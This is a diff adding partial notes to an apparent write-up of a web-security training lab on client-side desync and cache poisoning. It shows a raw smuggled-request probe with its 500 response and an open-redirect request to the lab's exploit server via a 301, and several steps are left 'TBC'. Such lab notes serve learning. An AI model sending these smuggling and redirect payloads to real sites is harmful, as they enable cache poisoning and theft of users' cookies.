@@ -229,6 +229,40 @@ To solve the lab:
 
     Combine these to craft an exploit that causes the victim's browser to poison its cache with a malicious resource import that calls alert(document.cookie) from the context of the main lab domain.
 
+Note: When testing your attack in the browser, make sure you clear your cached images and files between each attempt (Settings > Clear browsing data > Cached images and files).
+
+Hint:This lab is a client-side variation of a technique that we covered in a previous request smuggling lab.
+
+1. test for dsync
+```
+POST /../ HTTP/1.1
+
+Content-Length: 36
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+response
+```
+HTTP/1.1 500 Internal Server Error
+```
+
+2. TBC
+
+3. TBC
+
+4. using normaliztion of cap to lower, through 301 permanent redirect,  to do an open redirect :)
+request:
+```
+GET //https://exploit-0a98005003e69928c1da39a301700077.exploit-server.net/EXPLOIT HTTP/1.1
+```
+response:
+```
+HTTP/1.1 301 Moved Permanently
+Location: //https://exploit-0a98005003e69928c1da39a301700077.exploit-server.net/exploit
+```
+
+# TBC
 
 
 
